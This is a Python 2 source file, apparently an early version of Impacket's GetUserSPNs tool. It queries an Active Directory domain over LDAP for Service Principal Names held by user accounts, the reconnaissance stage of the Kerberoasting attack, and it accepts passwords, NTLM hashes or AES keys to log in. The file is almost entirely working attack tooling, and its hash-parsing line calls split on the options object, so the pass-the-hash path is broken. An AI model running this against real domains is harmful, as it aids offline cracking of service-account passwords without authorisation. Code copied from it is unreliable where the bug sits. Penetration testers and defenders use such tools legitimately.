#!/usr/bin/python
# Copyright (c) 2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#     This module will try to find Service Principal Names that are associated with normal user account.
#     Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#     will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#     bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#     This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#     https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#     Original idea of implementing this in Python belongs to @skelsec and his
#     https://github.com/skelsec/PyKerberoast project
#
#     This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#     Also, disabled accounts won't be shown.
#
# ToDo:
#  [ ] Add the capability for requesting TGS and output them in JtR/hashcat format
#  [ ] Improve the search filter, we have to specify we don't want machine accounts in the answer
#      (play with userAccountControl)
#


import argparse
import logging
import sys
from datetime import datetime

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.ldap import ldap, ldapasn1
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE

class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print outputFormat.format(*header)
        print '  '.join(['-' * itemLen for itemLen in colLen])

        # And now the rows
        for row in items:
            print outputFormat.format(*row)

    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = None
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.split(':')

        # Create the baseDN
        domainParts = self.__domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

    def getMachineName(self):
        s = SMBConnection(self.__domain, self.__domain)
        try:
            s.login('', '')
        except Exception, e:
            logging.debug('Error while anonymous logging into %s' % self.__domain)

        s.logoff()
        return s.getServerName()

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def run(self):
        if self.__doKerberos:
            self.__target = self.getMachineName()
        else:
            self.__target = self.__domain

        # Connect to LDAP
        ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN)
        if self.__doKerberos is not True:
            ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        else:
            ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

        searchFilter = ldapasn1.Filter()
        searchFilter['present'] = ldapasn1.Present('servicePrincipalName')

        resp = ldapConnection.search(searchFilter=searchFilter,
                                     attributes=['servicePrincipalName', 'sAMAccountName',
                                                 'pwdLastSet', 'MemberOf', 'userAccountControl'])
        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            for attribute in item['attributes']:
                if attribute['type'] == 'sAMAccountName':
                    if str(attribute['vals'][0]).endswith('$') is False:
                        # User Account
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                elif attribute['type'] == 'userAccountControl':
                    userAccountControl = str(attribute['vals'][0])
                elif attribute['type'] == 'memberOf':
                    memberOf = str(attribute['vals'][0])
                elif attribute['type'] == 'pwdLastSet':
                    pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                elif attribute['type'] == 'servicePrincipalName':
                    for spn in attribute['vals']:
                        SPNs.append(str(spn))

            if mustCommit is True:
                if int(userAccountControl) & UF_ACCOUNTDISABLE:
                    logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                else:
                    for spn in SPNs:
                        answers.append([spn, sAMAccountName,memberOf, pwdLastSet])

        if len(answers)>0:
            self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet"])

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print version.BANNER

    parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for SPNs that are running under a user account")

    parser.add_argument('target', action='store', help='domain/username[:password]')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    # This is because I'm lazy with regex
    # ToDo: We need to change the regex to fullfil domain/username[:password]
    targetParam = options.target+'@'
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    try:
        executer = GetUserSPNs(username, password, domain, options)
        executer.run()
    except Exception, e:
        print str(e)
